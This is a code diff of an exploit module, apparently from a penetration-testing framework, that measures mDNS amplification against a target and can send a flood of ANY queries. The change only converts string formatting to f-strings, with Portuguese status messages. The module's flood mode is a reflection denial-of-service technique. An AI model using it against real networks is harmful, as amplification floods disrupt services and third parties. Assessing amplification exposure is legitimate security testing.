@@ -164,10 +164,10 @@ class Exploit(Exploit):
 
     @multi
     def run(self):
-        print_status("mDNS Amplification Analysis → {}".format(self.target))
+        print_status(f"mDNS Amplification Analysis → {self.target}")
 
         if not self.check():
-            print_error("Nenhuma resposta mDNS de {}".format(self.target))
+            print_error(f"Nenhuma resposta mDNS de {self.target}")
             return
 
         print_success("Responder mDNS confirmado")
@@ -194,7 +194,7 @@ class Exploit(Exploit):
         query_results.append(("Multi-question (5 tipos)", rq, rs, rc, amp))
 
         headers = ["Query", "Req (B)", "Resp (B)", "# Resp", "Amplificação"]
-        rows = [(q[0], str(q[1]), str(q[2]), str(q[3]), "{:.1f}x".format(q[4]))
+        rows = [(q[0], str(q[1]), str(q[2]), str(q[3]), f"{q[4]:.1f}x")
                 for q in query_results]
         print_table(headers, *rows)
 
@@ -202,14 +202,14 @@ class Exploit(Exploit):
         if responsive:
             best = max(responsive, key=lambda x: x[4])
             avg_amp = sum(q[4] for q in responsive) / len(responsive)
-            print_info("Melhor: {:.1f}x com '{}'".format(best[4], best[0]))
-            print_info("Amplificação média: {:.1f}x".format(avg_amp))
+            print_info(f"Melhor: {best[4]:.1f}x com '{best[0]}'")
+            print_info(f"Amplificação média: {avg_amp:.1f}x")
             if best[4] >= 10:
                 print_warning("ALTO fator de amplificação (>= 10x)")
             elif best[4] >= 3:
                 print_warning("MODERADO fator de amplificação (>= 3x)")
 
-        print_status("Medição detalhada ({} probes)...".format(self.probe_count))
+        print_status(f"Medição detalhada ({self.probe_count} probes)...")
         probe_results = []
         for _ in range(int(self.probe_count)):
             rq, rs, rc = self._send_query(any_query, collect_time=3)
@@ -220,16 +220,15 @@ class Exploit(Exploit):
         if probe_results:
             avg_a = sum(p[2] for p in probe_results) / len(probe_results)
             avg_r = sum(p[1] for p in probe_results) / len(probe_results)
-            print_info("Probe: avg resp {:.0f} bytes | avg amplificação {:.1f}x".format(avg_r, avg_a))
+            print_info(f"Probe: avg resp {avg_r:.0f} bytes | avg amplificação {avg_a:.1f}x")
 
         if not self.measure_only:
-            print_status("Enviando {} queries flood...".format(self.flood_count))
+            print_status(f"Enviando {self.flood_count} queries flood...")
             pkt = _build_any_query(self.query_name)
             sent, total = self._flood_burst(pkt, int(self.flood_count), float(self.flood_delay))
             avg = sum(p[2] for p in probe_results) / len(probe_results) if probe_results else 1
             est = total * avg
-            print_info("Flood: {} pacotes, {} bytes, ~{:.0f} bytes refletidos estimados".format(
-                sent, total, est))
+            print_info(f"Flood: {sent} pacotes, {total} bytes, ~{est:.0f} bytes refletidos estimados")
         else:
             print_info("Modo measure-only — defina measure_only=false para flood test")
 
